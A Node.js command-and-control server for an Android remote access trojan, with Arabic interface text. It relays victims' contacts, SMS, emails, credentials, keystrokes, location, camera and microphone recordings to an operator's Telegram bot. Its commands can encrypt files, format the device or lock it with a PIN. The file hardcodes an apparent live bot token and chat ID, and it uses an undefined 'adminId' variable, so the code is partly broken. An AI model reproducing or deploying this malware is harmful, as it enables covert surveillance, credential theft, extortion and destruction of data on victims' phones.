const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

// =============== التهيئة ===============

const token = '8987687225:AAEFIlCRyNyOIBJMIwHkNpZSU92L_0QWdu4'
const id = '6837315281'
const address = 'https://www.google.com';

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });
const clients = new Map();
const upload = multer();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// متغيرات الحالة
let state = { uuid: '', number: '', title: '', message: '' };

// =============== صفحة الفحص ===============
app.get('/', (req, res) => {
    res.send(`<h1 style="text-align:center;padding-top:100px;font-family:Arial;">✅ RAT Server Running<br><small>Connected: ${clients.size}</small></h1>`);
});

// =============== استقبال البيانات من جهاز الأندرويد ===============
app.post('/api/upload', upload.any(), (req, res) => {
    const deviceId = req.headers['x-device-id'] || 'unknown';
    const type = req.body.type || req.headers['x-type'] || 'text';
    const deviceModel = req.headers['x-model'] || 'Unknown';
    const data = req.body.data || req.body.text || '';
    const file = req.files ? req.files[0] : null;

    console.log(`📩 استقبال: ${type} من ${deviceModel}`);

    try {
        switch(type) {
            case 'contacts':
                bot.sendDocument(adminId, Buffer.from(data), {
                    caption: `📞 جهات اتصال من <b>${deviceModel}</b>`,
                    parse_mode: 'HTML'
                }, { filename: `contacts_${Date.now()}.txt`, contentType: 'text/plain' });
                sendSuccess(adminId, `📞 تم استلام جهات الاتصال من <b>${deviceModel}</b> ✅`);
                break;

            case 'calls':
                bot.sendDocument(adminId, Buffer.from(data), {
                    caption: `📞 سجل المكالمات من <b>${deviceModel}</b>`,
                    parse_mode: 'HTML'
                }, { filename: `calls_${Date.now()}.txt`, contentType: 'text/plain' });
                sendSuccess(adminId, `📞 تم استلام سجل المكالمات من <b>${deviceModel}</b> ✅`);
                break;

            case 'sms':
                bot.sendDocument(adminId, Buffer.from(data), {
                    caption: `💬 جميع الرسائل من <b>${deviceModel}</b>`,
                    parse_mode: 'HTML'
                }, { filename: `sms_${Date.now()}.txt`, contentType: 'text/plain' });
                sendSuccess(adminId, `💬 تم استلام الرسائل من <b>${deviceModel}</b> ✅`);
                break;

            case 'emails':
                bot.sendDocument(adminId, Buffer.from(data), {
                    caption: `📧 البريد الإلكتروني من <b>${deviceModel}</b>`,
                    parse_mode: 'HTML'
                }, { filename: `emails_${Date.now()}.txt`, contentType: 'text/plain' });
                sendSuccess(adminId, `📧 تم استلام البريد الإلكتروني من <b>${deviceModel}</b> ✅`);
                break;

            case 'apps':
                bot.sendDocument(adminId, Buffer.from(data), {
                    caption: `📱 تطبيقات <b>${deviceModel}</b>`,
                    parse_mode: 'HTML'
                }, { filename: `apps_${Date.now()}.txt`, contentType: 'text/plain' });
                sendSuccess(adminId, `📱 تم استلام التطبيقات من <b>${deviceModel}</b> ✅`);
                break;

            case 'device_info':
                bot.sendMessage(adminId, 
                    `ℹ️ <b>معلومات جهاز</b>\n━━━━━━━━━━━━━━\n${data}`,
                    { parse_mode: 'HTML' }
                );
                sendSuccess(adminId, `ℹ️ تم استلام معلومات <b>${deviceModel}</b> ✅`);
                break;

            case 'clipboard':
                bot.sendMessage(adminId,
                    `📋 <b>محتويات الحافظة</b> من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${data || '(فارغة)'}`,
                    { parse_mode: 'HTML' }
                );
                break;

            case 'location':
                const [lat, lon] = data.split(',');
                if (lat && lon) {
                    bot.sendLocation(adminId, parseFloat(lat), parseFloat(lon));
                    bot.sendMessage(adminId,
                        `📍 موقع <b>${deviceModel}</b>\n🌐 https://maps.google.com/?q=${lat},${lon}`,
                        { parse_mode: 'HTML' }
                    );
                }
                break;

            case 'screenshot':
                if (file) {
                    bot.sendPhoto(adminId, file.buffer, {
                        caption: `📸 لقطة شاشة من <b>${deviceModel}</b>`,
                        parse_mode: 'HTML'
                    });
                }
                break;

            case 'photo':
                if (file) {
                    bot.sendPhoto(adminId, file.buffer, {
                        caption: `📸 صورة من كاميرا <b>${deviceModel}</b>`,
                        parse_mode: 'HTML'
                    });
                }
                break;

            case 'video':
                if (file) {
                    bot.sendVideo(adminId, file.buffer, {
                        caption: `🎥 فيديو من كاميرا <b>${deviceModel}</b>`,
                        parse_mode: 'HTML'
                    });
                }
                break;

            case 'audio':
                if (file) {
                    bot.sendVoice(adminId, file.buffer, {
                        caption: `🎤 تسجيل صوتي من <b>${deviceModel}</b>`,
                        parse_mode: 'HTML'
                    });
                }
                break;

            case 'file':
                if (file) {
                    bot.sendDocument(adminId, file.buffer, {
                        caption: `📁 ملف من <b>${deviceModel}</b>\n📄 ${file.originalname}`,
                        parse_mode: 'HTML'
                    }, { filename: file.originalname, contentType: file.mimetype });
                }
                break;

            case 'credentials':
                bot.sendMessage(adminId,
                    `💳 <b>حسابات مسروقة</b> من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${data}`,
                    { parse_mode: 'HTML' }
                );
                break;

            case 'keylog':
                bot.sendMessage(adminId,
                    `⌨️ <b>ضغطات المفاتيح</b> من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n<code>${data}</code>`,
                    { parse_mode: 'HTML' }
                );
                break;

            case 'notification':
                const [app, notifTitle, notifBody] = (data || '').split('|');
                bot.sendMessage(adminId,
                    `🔔 <b>إشعار</b> من <b>${deviceModel}</b>\n• 📱 ${app || 'غير معروف'}\n• 📌 ${notifTitle || ''}\n• 📄 ${notifBody || ''}`,
                    { parse_mode: 'HTML' }
                );
                break;

            case 'photos_list':
                bot.sendDocument(adminId, Buffer.from(data), {
                    caption: `🖼️ قائمة الصور من <b>${deviceModel}</b> (أرسل المسار لتحميل صورة معينة)`,
                    parse_mode: 'HTML'
                }, { filename: `photos_${Date.now()}.txt`, contentType: 'text/plain' });
                bot.sendMessage(adminId,
                    '📌 للتحميل: استخدم أمر "تنزيل ملف" وأدخل المسار الكامل للصورة',
                    { parse_mode: 'HTML' }
                );
                break;

            case 'status':
                bot.sendMessage(adminId, 
                    `📊 <b>حالة الجهاز</b> <b>${deviceModel}</b>\n${data}`,
                    { parse_mode: 'HTML' }
                );
                break;

            case 'encrypted':
                bot.sendMessage(adminId, 
                    `🔐 <b>تم تشفير الملفات</b> على <b>${deviceModel}</b> بنجاح!`,
                    { parse_mode: 'HTML' }
                );
                break;

            case 'formatted':
                bot.sendMessage(adminId,
                    `💣 <b>تم فرمتة</b> جهاز <b>${deviceModel}</b> بنجاح! 💀`,
                    { parse_mode: 'HTML' }
                );
                break;

            case 'locked':
                bot.sendMessage(adminId,
                    `🔒 <b>تم قفل</b> جهاز <b>${deviceModel}</b> بنجاح!`,
                    { parse_mode: 'HTML' }
                );
                break;

            default:
                bot.sendMessage(adminId,
                    `📩 بيانات من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${data}`,
                    { parse_mode: 'HTML' }
                );
        }
    } catch (err) {
        console.error('❌ خطأ في معالجة البيانات:', err.message);
        bot.sendMessage(adminId, `❌ خطأ: ${err.message}`);
    }

    res.json({ status: 'ok' });
});

// =============== WebSocket للاتصال الفوري ===============
wss.on('connection', (ws, req) => {
    const deviceId = uuid4.v4();
    const model = req.headers['x-model'] || 'Unknown';
    const battery = req.headers['x-battery'] || '0';
    const version = req.headers['x-version'] || 'Unknown';
    const provider = req.headers['x-provider'] || 'Unknown';
    const imei = req.headers['x-imei'] || 'Unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    ws.deviceId = deviceId;
    ws.model = model;

    clients.set(deviceId, {
        model, battery, version, provider, imei, ip,
        connectedAt: Date.now(), ws, uuid: deviceId
    });

    console.log(`✅ جهاز متصل: ${model} (${deviceId.substring(0, 8)}...)`);

    bot.sendMessage(adminId,
        `✅ <b>جهاز جديد متصل!</b>\n` +
        `📱 ${model}\n` +
        `🔋 ${battery}%\n` +
        `🤖 ${version}\n` +
        `📶 ${provider}\n` +
        `🆔 <code>${deviceId.substring(0, 8)}</code>\n` +
        `🕐 ${new Date().toLocaleString('ar-EG')}`,
        { parse_mode: 'HTML' }
    );

    ws.on('close', () => {
        clients.delete(deviceId);
        bot.sendMessage(adminId,
            `❌ <b>جهاز انقطع:</b> ${model}\n🆔 <code>${deviceId.substring(0, 8)}</code>`,
            { parse_mode: 'HTML' }
        );
    });

    ws.on('message', (data) => {
        try {
            const msg = data.toString();
            console.log(`📩 WebSocket من ${model}: ${msg.substring(0, 80)}`);
            
            // معالجة رسائل WebSocket المباشرة
            if (msg.startsWith('contacts:')) {
                bot.sendDocument(adminId, Buffer.from(msg.substring(9)), {
                    caption: `📞 جهات اتصال من <b>${model}</b>`,
                    parse_mode: 'HTML'
                }, { filename: `contacts_${deviceId}.txt` });
                bot.sendMessage(adminId, `✅ تم استلام جهات اتصال <b>${model}</b>`, { parse_mode: 'HTML' });
            }
            else if (msg.startsWith('calls:')) {
                bot.sendDocument(adminId, Buffer.from(msg.substring(6)), {
                    caption: `📞 سجل مكالمات من <b>${model}</b>`,
                    parse_mode: 'HTML'
                }, { filename: `calls_${deviceId}.txt` });
                bot.sendMessage(adminId, `✅ تم استلام سجل مكالمات <b>${model}</b>`, { parse_mode: 'HTML' });
            }
            else if (msg.startsWith('sms:')) {
                bot.sendDocument(adminId, Buffer.from(msg.substring(4)), {
                    caption: `💬 رسائل من <b>${model}</b>`,
                    parse_mode: 'HTML'
                }, { filename: `sms_${deviceId}.txt` });
                bot.sendMessage(adminId, `✅ تم استلام رسائل <b>${model}</b>`, { parse_mode: 'HTML' });
            }
            else if (msg.startsWith('info:')) {
                bot.sendMessage(adminId, `ℹ️ <b>${model}</b>\n${msg.substring(5)}`, { parse_mode: 'HTML' });
                bot.sendMessage(adminId, `✅ تم استلام معلومات <b>${model}</b>`, { parse_mode: 'HTML' });
            }
            else if (msg.startsWith('location:')) {
                const parts = msg.split(':');
                if (parts.length >= 3) {
                    bot.sendLocation(adminId, parseFloat(parts[1]), parseFloat(parts[2]));
                    bot.sendMessage(adminId, `📍 موقع <b>${model}</b>`, { parse_mode: 'HTML' });
                }
            }
            else if (msg == 'done' || msg == 'ok') {
                // تأكيد تنفيذ الأمر
            }
            else {
                // أي رسالة أخرى
                bot.sendMessage(adminId,
                    `📩 من <b>${model}</b>:\n<code>${msg.substring(0, 500)}</code>`,
                    { parse_mode: 'HTML' }
                );
            }
        } catch (e) {
            console.error('WebSocket error:', e.message);
        }
    });
});

// =============== دوال مساعدة ===============
function sendSuccess(chatId, msg) {
    bot.sendMessage(chatId, `✅ ${msg}`, { parse_mode: 'HTML' });
}

function sendCmd(uuid, cmd) {
    const client = clients.get(uuid);
    if (client && client.ws && client.ws.readyState === 1) {
        client.ws.send(cmd);
        console.log(`📤 أرسل ${cmd} إلى ${client.model}`);
        return true;
    }
    return sendCmdHttp(uuid, cmd);
}

async function sendCmdHttp(uuid, cmd) {
    // محاولة HTTP API
    const client = clients.get(uuid);
    if (client && client.httpUrl) {
        try {
            await axios.post(client.httpUrl + '/cmd', { cmd });
            return true;
        } catch (e) {}
    }
    return false;
}

function showMainMenu(msg) {
    bot.sendMessage(adminId,
        `${msg}\n━━━━━━━━━━━━━━\n<b>القائمة الرئيسية:</b>`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['📱 الأجهزة المتصلة', '⚙️ لوحة التحكم'],
                    ['📊 الإحصائيات']
                ],
                resize_keyboard: true
            }
        }
    );
}

// =============== معالجة أوامر البوت ===============
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text || '';

    // التحقق من الصلاحية
    if (chatId != adminId) {
        bot.sendMessage(chatId, '❌ غير مصرح');
        return;
    }

    // ===== معالجة الردود =====
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text || '';
        
        if (replyText.includes('أدخل الرقم')) {
            state.number = text;
            bot.sendMessage(adminId, '💬 أدخل الرسالة:', { reply_markup: { force_reply: true } });
            return;
        }
        if (replyText.includes('أدخل الرسالة:') && state.number) {
            sendCmd(state.uuid, `send_sms:${state.number}:${text}`);
            state.number = '';
            state.uuid = '';
            showMainMenu('✅ تم إرسال الرسالة!');
            return;
        }
        if (replyText.includes('رسالة للجميع')) {
            sendCmd(state.uuid, `broadcast:${text}`);
            state.uuid = '';
            showMainMenu('✅ تم إرسال للجميع!');
            return;
        }
        if (replyText.includes('مسار الملف')) {
            sendCmd(state.uuid, `get_file:${text}`);
            state.uuid = '';
            showMainMenu('⏳ جاري تحميل الملف...');
            return;
        }
        if (replyText.includes('حذف الملف')) {
            sendCmd(state.uuid, `del_file:${text}`);
            state.uuid = '';
            showMainMenu('✅ تم حذف الملف!');
            return;
        }
        if (replyText.includes('المدة بالثواني')) {
            sendCmd(state.uuid, `record:${text}`);
            state.uuid = '';
            showMainMenu(`🎤 جاري التسجيل ${text} ثانية...`);
            return;
        }
        if (replyText.includes('الرابط')) {
            sendCmd(state.uuid, `open:${text}`);
            state.uuid = '';
            showMainMenu('✅ تم فتح الرابط!');
            return;
        }
        if (replyText.includes('رمز القفل')) {
            sendCmd(state.uuid, `lock:${text}`);
            state.uuid = '';
            showMainMenu(`🔒 تم القفل بالرمز ${text}!`);
            return;
        }
        if (replyText.includes('عنوان الإشعار')) {
            state.title = text;
            bot.sendMessage(adminId, '📝 أدخل محتوى الإشعار:', { reply_markup: { force_reply: true } });
            return;
        }
        if (replyText.includes('محتوى الإشعار')) {
            sendCmd(state.uuid, `notify:${state.title}|${text}`);
            state.title = '';
            state.uuid = '';
            showMainMenu('✅ تم إرسال الإشعار!');
            return;
        }
    }

    // ===== الأوامر الرئيسية =====
    if (text == '/start') {
        showMainMenu('👋 مرحبا في بوت الاختراق v3.0\n\n' +
            '🆕 <b>الإمكانيات الجديدة:</b>\n' +
            '• ⌨️ Keylogger (قراءة كل ما يكتب)\n' +
            '• 🔔 مراقبة الإشعارات\n' +
            '• 📧 سحب البريد الإلكتروني\n' +
            '• 💳 سحب الحسابات\n' +
            '• 🔐 تشفير الملفات\n' +
            '• 💣 فرمته الجهاز\n' +
            '• 🔒 قفل الجهاز برمز\n' +
            '• 🔗 فتح رابط مباشر');
    }
    else if (text == '📱 الأجهزة المتصلة') {
        if (clients.size == 0) {
            bot.sendMessage(adminId, '❌ لا توجد أجهزة متصلة!\n⚠️ تأكد من تثبيت التطبيق على جهاز الضحية');
        } else {
            let list = '📱 <b>الأجهزة المتصلة:</b>\n━━━━━━━━━━━━━━\n';
            clients.forEach((c, uid) => {
                list += `• <b>${c.model}</b> 🔋${c.battery}%\n  🆔 <code>${uid.substring(0, 8)}</code>\n`;
            });
            bot.sendMessage(adminId, list, { parse_mode: 'HTML' });
        }
    }
    else if (text == '⚙️ لوحة التحكم') {
        if (clients.size == 0) {
            bot.sendMessage(adminId, '❌ لا توجد أجهزة متصلة!');
        } else {
            const buttons = [];
            clients.forEach((c, uid) => {
                buttons.push([{ text: `📱 ${c.model} 🔋${c.battery}%`, callback_data: `ctrl:${uid}` }]);
            });
            bot.sendMessage(adminId, '⚙️ <b>اختر جهاز:</b>', {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: buttons }
            });
        }
    }
    else if (text == '📊 الإحصائيات') {
        bot.sendMessage(adminId,
            `📊 <b>إحصائيات</b>\n` +
            `• الأجهزة: ${clients.size}\n` +
            `• الحالة: ✅ نشط\n` +
            `• 🕐 ${new Date().toLocaleString('ar-EG')}`,
            { parse_mode: 'HTML' }
        );
    }
});

// =============== معالجة الأزرار ===============
bot.on('callback_query', async (cq) => {
    const msg = cq.message;
    const data = cq.callback_query.data || cq.data;
    const [action, uuid, extra] = (data || '').split(':');

    if (!action || !uuid) return;

    const client = clients.get(uuid);
    if (!client) {
        bot.answerCallbackQuery(cq.id || cq.callback_query?.id, { text: '❌ الجهاز غير متصل!', show_alert: true });
        return;
    }

    // قائمة الأوامر السريعة
    const quickCmds = {
        'info': 'device_info',
        'contacts': 'get_contacts',
        'calls': 'get_calls',
        'sms': 'get_sms',
        'emails': 'get_emails',
        'apps': 'get_apps',
        'clipboard': 'get_clipboard',
        'location': 'get_location',
        'screenshot': 'capture_screen',
        'credentials': 'get_credentials',
        'keylogger_on': 'keylogger_start',
        'keylogger_off': 'keylogger_stop',
        'notif_on': 'notif_start',
        'notif_off': 'notif_stop',
        'vibrate': 'do_vibrate',
        'stop_audio': 'audio_stop',
        'encrypt': 'do_encrypt',
        'format': 'do_format',
        'camera_main': 'photo_main',
        'camera_selfie': 'photo_selfie',
        'photos': 'list_photos'
    };

    if (quickCmds[action]) {
        sendCmd(uuid, quickCmds[action]);
        bot.deleteMessage(adminId, msg.message_id);
        showMainMenu(`⏳ جاري تنفيذ ${action}...`);
        return;
    }

    // أوامر تتطلب إدخال
    if (action == 'ctrl') {
        showDeviceMenu(msg, uuid, client);
    }
    else if (action == 'send_sms') {
        state.uuid = uuid;
        bot.deleteMessage(adminId, msg.message_id);
        bot.sendMessage(adminId, '📱 أدخل الرقم:', { reply_markup: { force_reply: true } });
    }
    else if (action == 'broadcast') {
        state.uuid = uuid;
        bot.deleteMessage(adminId, msg.message_id);
        bot.sendMessage(adminId, '💬 أدخل رسالة للجميع:', { reply_markup: { force_reply: true } });
    }
    else if (action == 'get_file' || action == 'del_file') {
        state.uuid = uuid;
        state.message = action;
        bot.deleteMessage(adminId, msg.message_id);
        bot.sendMessage(adminId,
            action == 'get_file' ? '📁 أدخل مسار الملف:' : '🗑️ أدخل مسار الملف للحذف:',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (action == 'record_mic') {
        state.uuid = uuid;
        bot.deleteMessage(adminId, msg.message_id);
        bot.sendMessage(adminId, '🎤 أدخل المدة بالثواني (1-300):', { reply_markup: { force_reply: true } });
    }
    else if (action == 'record_vid_main' || action == 'record_vid_selfie') {
        state.uuid = uuid;
        state.message = action;
        bot.deleteMessage(adminId, msg.message_id);
        bot.sendMessage(adminId, '🎥 أدخل المدة بالثواني (1-60):', { reply_markup: { force_reply: true } });
    }
    else if (action == 'open_url') {
        state.uuid = uuid;
        bot.deleteMessage(adminId, msg.message_id);
        bot.sendMessage(adminId, '🔗 أدخل الرابط:', { reply_markup: { force_reply: true } });
    }
    else if (action == 'lock_device') {
        state.uuid = uuid;
        bot.deleteMessage(adminId, msg.message_id);
        bot.sendMessage(adminId, '🔒 أدخل رمز القفل (4 أرقام):', { reply_markup: { force_reply: true } });
    }
    else if (action == 'notify') {
        state.uuid = uuid;
        bot.deleteMessage(adminId, msg.message_id);
        bot.sendMessage(adminId, '📌 أدخل عنوان الإشعار:', { reply_markup: { force_reply: true } });
    }
    else if (action == 'toast') {
        state.uuid = uuid;
        bot.deleteMessage(adminId, msg.message_id);
        bot.sendMessage(adminId, '💬 أدخل نص الـ Toast:', { reply_markup: { force_reply: true } });
    }
    else if (action == 'back') {
        showDeviceList(msg);
    }
    else if (action == 'confirm_format') {
        sendCmd(uuid, 'do_format');
        bot.deleteMessage(adminId, msg.message_id);
        showMainMenu('💣 جاري فرمتة الجهاز...');
    }
    else if (action == 'confirm_encrypt') {
        sendCmd(uuid, 'do_encrypt');
        bot.deleteMessage(adminId, msg.message_id);
        showMainMenu('🔐 جاري تشفير الملفات...');
    }
});

// =============== عرض قائمة الجهاز ===============
function showDeviceMenu(msg, uuid, client) {
    const dangerStyle = (text, action) => ({ text, callback_data: `${action}:${uuid}:`, color: 'red' });
    
    bot.editMessageText(
        `⚙️ <b>${client.model}</b>\n🔋 ${client.battery}% | 📶 ${client.provider}\n━━━━━━━━━━━━━━\n<b>اختر الأمر:</b>`,
        {
            chat_id: adminId,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'ℹ️ معلومات الجهاز', callback_data: `info:${uuid}:` }],
                    [{ text: '📞 جهات الاتصال', callback_data: `contacts:${uuid}:` },
                     { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}:` }],
                    [{ text: '💬 جميع الرسائل', callback_data: `sms:${uuid}:` },
                     { text: '📧 البريد الإلكتروني', callback_data: `emails:${uuid}:` }],
                    [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}:` },
                     { text: '📋 الحافظة', callback_data: `clipboard:${uuid}:` }],
                    [{ text: '📍 الموقع', callback_data: `location:${uuid}:` },
                     { text: '📸 لقطة شاشة', callback_data: `screenshot:${uuid}:` }],
                    [{ text: '🖼️ سحب الصور', callback_data: `photos:${uuid}:` },
                     { text: '💳 الحسابات', callback_data: `credentials:${uuid}:` }],
                    [{ text: '📸 كاميرا خلفية', callback_data: `camera_main:${uuid}:` },
                     { text: '🤳 كاميرا أمامية', callback_data: `camera_selfie:${uuid}:` }],
                    [{ text: '🎤 تسجيل ميكروفون', callback_data: `record_mic:${uuid}:` }],
                    [{ text: '🎥 تسجيل فيديو خلفي', callback_data: `record_vid_main:${uuid}:` },
                     { text: '🎥 تسجيل سيلفي', callback_data: `record_vid_selfie:${uuid}:` }],
                    [{ text: '📁 تنزيل ملف', callback_data: `get_file:${uuid}:` },
                     { text: '🗑️ حذف ملف', callback_data: `del_file:${uuid}:` }],
                    [{ text: '📨 إرسال SMS', callback_data: `send_sms:${uuid}:` },
                     { text: '📨 رسالة للجميع', callback_data: `broadcast:${uuid}:` }],
                    [{ text: '🔗 فتح رابط', callback_data: `open_url:${uuid}:` },
                     { text: '🔒 قفل الجهاز', callback_data: `lock_device:${uuid}:` }],
                    [{ text: '📲 إشعار', callback_data: `notify:${uuid}:` },
                     { text: '💬 Toast', callback_data: `toast:${uuid}:` }],
                    [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}:` },
                     { text: '🔇 إيقاف صوت', callback_data: `stop_audio:${uuid}:` }],
                    [{ text: '⌨️ Keylogger ON', callback_data: `keylogger_on:${uuid}:` },
                     { text: '⌨️ Keylogger OFF', callback_data: `keylogger_off:${uuid}:` }],
                    [{ text: '🔔 إشعارات ON', callback_data: `notif_on:${uuid}:` },
                     { text: '🔔 إشعارات OFF', callback_data: `notif_off:${uuid}:` }],
                    [{ text: '🔐 تشفير الملفات', callback_data: `confirm_encrypt:${uuid}:`, color: 'red' }],
                    [{ text: '💣 فرمته الجهاز', callback_data: `confirm_format:${uuid}:`, color: 'red' }],
                    [{ text: '🔙 رجوع', callback_data: `back:${uuid}:` }]
                ]
            }
        }
    );
}

function showDeviceList(msg) {
    const buttons = [];
    clients.forEach((c, uid) => {
        buttons.push([{ text: `📱 ${c.model} 🔋${c.battery}%`, callback_data: `ctrl:${uid}` }]);
    });
    bot.editMessageText('⚙️ <b>اختر جهاز:</b>', {
        chat_id: adminId,
        message_id: msg.message_id,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: buttons }
    });
}

// =============== Ping ===============
setInterval(() => {
    clients.forEach((c, uid) => {
        if (c.ws && c.ws.readyState === 1) {
            c.ws.send('ping');
        } else {
            clients.delete(uid);
        }
    });
}, 10000);

// =============== تشغيل الخادم ===============
const PORT = process.env.PORT || 8999;
server.listen(PORT, () => {
    console.log(`🚀 RAT v3.0 على المنفذ ${PORT}`);
    bot.sendMessage(adminId, `🚀 <b>تم التشغيل!</b>\n🕐 ${new Date().toLocaleString('ar-EG')}`, { parse_mode: 'HTML' });
});
